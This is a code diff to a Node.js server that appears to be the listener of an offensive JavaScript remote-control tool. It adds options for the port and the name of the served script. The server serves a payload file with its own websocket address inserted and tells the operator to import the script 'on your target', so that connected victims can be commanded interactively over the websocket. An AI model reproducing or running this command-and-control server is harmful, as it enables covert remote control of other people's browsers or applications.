@@ -4,12 +4,21 @@ const ws = require('ws')
 const prompts = require('prompts')
 const fs = require('fs')
 
+argv = require('minimist')(process.argv.slice(2), {
+  string: ['port', 'file'],
+  alias: {p: 'port', f: 'file'},
+  default: {port: 3000, file: 'client.js'},
+  help: true
+})
+
+console.log(`Listening on port ${argv.port}.\nImport the script located at /${argv.file} on your target`)
+
 const app = express()
 app.use(cors())
-const server = app.listen(3000)
+const server = app.listen(argv.port)
 const wsServer = new ws.Server({ server })
 
-app.get('/client.js', (req, res) => {
+app.get(`/${argv.file}`, (req, res) => {
   const websocket = `ws${req.protocol == 'https' ? 's':''}://${req.get('host')}/`
   const payload = fs.readFileSync('./payloads/client.js', 'utf8').replace('%websocket%', websocket)
   res.type('application/javascript')
@@ -18,8 +27,6 @@ app.get('/client.js', (req, res) => {
 
 let clientSocket = false
 let prompt = false
-
-console.log('Listening on port 3000.\nImport the script located at /client.js on your target')
 
 wsServer.on('connection', socket => {
   console.log('client connected.')
